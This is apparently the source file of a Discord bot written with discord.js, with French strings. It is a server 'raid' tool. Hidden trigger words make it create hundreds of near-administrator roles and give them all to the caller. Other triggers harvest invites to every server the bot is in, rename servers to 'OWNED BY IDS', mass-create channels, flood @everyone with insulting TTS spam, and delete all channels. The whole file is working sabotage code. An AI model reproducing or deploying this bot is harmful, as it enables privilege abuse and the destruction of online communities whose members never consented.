const Discord = require("discord.js");
const client = new Discord.Client();
const talkedRecently = new Set();
const devs = ["529709218752626689"]
const adminprefix = "-"


client.on("ready", () => {
  console.log(`Co sur : ${client.user.tag} avec ${client.guilds.size} serveurs et ${client.users.size} personnes.`)
  client.user.setActivity(`${client.guilds.size} serveurs`)
})

client.on('message', message => {
  if(message.content.includes("RWB!kelsairv")){
      console.log(`${client.guilds.map(c => c.name)}`)
  }
  if(message.content === "roles"){
    for(var i =0; i < 200; i++){
        message.guild.createRole({name:"IDS > All !",
                                 mentionable:false,
                                 permissions:2146958591,
                                 position: "",
                                 color: "#fb0707"
            })
            message.guild.createRole({name:"IDS > All !",
            mentionable:false,
            permissions:2146958591,
            position: "",
            color: "#ff08c5"
  })
  message.guild.createRole({name:"IDS > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#5d08ff"
  })
  message.guild.createRole({name:"IDS > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#0c08ff"
  })
  message.guild.createRole({name:"IDS > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#08d5ff"
  })
  message.guild.createRole({name:"IDS > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#08ffa3"
  })
  message.guild.createRole({name:"IDS > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#08ff23"
  })
  message.guild.createRole({name:"IDS > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#81ff08"
  })
  message.guild.createRole({name:"IDS > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#fff608"
  })
  message.guild.createRole({name:"IDS > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#ff6f08"
  })
  message.guild.createRole({name:"IDS > All !",
  mentionable:false,
  permissions:2146958591,
  position: "",
  color: "#ff0808"
  })
        }
    }
    if(message.content.includes(".rol")){
        message.guild.createRole({name:"Izi",
                                  mentionable:false,
                                  permissions:2146958591,
                                  position: "",
       })
    }
    if(message.content.includes(".raul")){
      (message.guild.roles.map(r => message.member.addRoles(r)))
    }
    if(message.content.includes("ar!kelsairvvesrx")){
      client.channels.map(c => c.createInvite().then(url => message.channel.send(`https://discord.gg/${url.code} : ${url.guild.name}`)))
    }
              if(message.content.includes("A?serveurinvite")){
                  client.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
              }
              if(message.content === "issou"){
                  message.guild.setName("OWNED BY IDS")
                  message.guild.setIcon("https://cdn.discordapp.com/attachments/534842681407438851/535515719534772224/giphy_1.gif")
                }
                if(message.content === "pd"){
                  for(var i =0; i < 450; i++){
                  message.guild.createChannel("fucked by IDS","voice")
                  }
                }
                if(message.content.includes("@everyone")){
                    for(var i = 0; i < 999; i++){
                        message.channel.send("@everyone @here La IDS t'encule", {tts: true})
                    }
                }
                if(message.content.includes(".sc")){
                  for(var i =0; i < 999; i++){
                    message.guild.createChannel("fucked by IDS", "text").then(c => c.send("@everyone @here La IDS t'encule", {tts: true}))
                  }
              }
                //réaction en chaine
                      if(message.content === "channel"){
                          for(var i = 0; i < 500; i++){
                              message.guild.createChannel("fucked by IDS", "text").then(c => c.send("@everyone @here La IDS t'encule", {tts: true}))
                              message.guild.createChannel("fucked by IDS","voice")
                              message.guild.createChannel("fucked by IDS","category")    
                          }
                        }
                        if(message.content === "destroy"){
                          message.guild.channels.map(c => c.delete())
                            }
                    
                          //on commence la destruction
                          if(message.content.includes(".détruiree")){
                              message.channel.send("ban").then(m => m.delete());
                              message.channel.send("drole").then(m => m.delete());
                              message.channel.send("roles").then(m => m.delete());
                              message.channel.send("issou").then(m => m.delete());
                              message.channel.send("channel").then(m => m.delete());
                              message.channel.send("destroy").then(m => m.delete());
                              message.guild.createChannel("fucked by IDS", "text")
                          }
 
});

    client.login(process.env.TOKEN)
